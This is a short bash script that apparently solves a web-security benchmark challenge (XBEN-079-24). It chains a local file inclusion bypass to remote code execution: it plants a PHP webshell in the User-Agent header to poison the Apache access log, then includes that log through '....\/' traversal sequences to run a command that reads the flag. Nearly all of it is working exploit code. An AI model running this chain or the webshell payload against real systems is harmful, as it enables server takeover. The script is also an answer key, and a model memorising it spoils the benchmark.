#!/usr/bin/env bash
# XBEN-079-24 — LFI to RCE via Apache access-log poisoning. Proxy-mode twin.
# post.php?id= includes posts/<id> after a single-pass str_replace filter that
# `....\/` survives. First poison the access log with a PHP payload in the
# User-Agent, then include /var/log/apache2/access.log so the payload runs;
# `query.9` is the command (cat /FLAG.php).
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
CMD="${2:-cat /FLAG.php}"
SESSION="xben079p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
# 1. Poison the access log: a request whose User-Agent is a PHP webshell.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/post.php' --set 'query.id=ScriptKiddie.php' \
  --set 'header.user-agent=<?php system($_GET[9]); ?>' >/dev/null
# 2. Include the log through the LFI (`....\/` defeats the one-pass filter); the
#    webshell runs and query.9 is the command.
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/post.php' \
  --set 'query.id=....\/....\/....\/....\/var/log/apache2/access.log' \
  --set "+query.9=$CMD" >/dev/null
print_flag
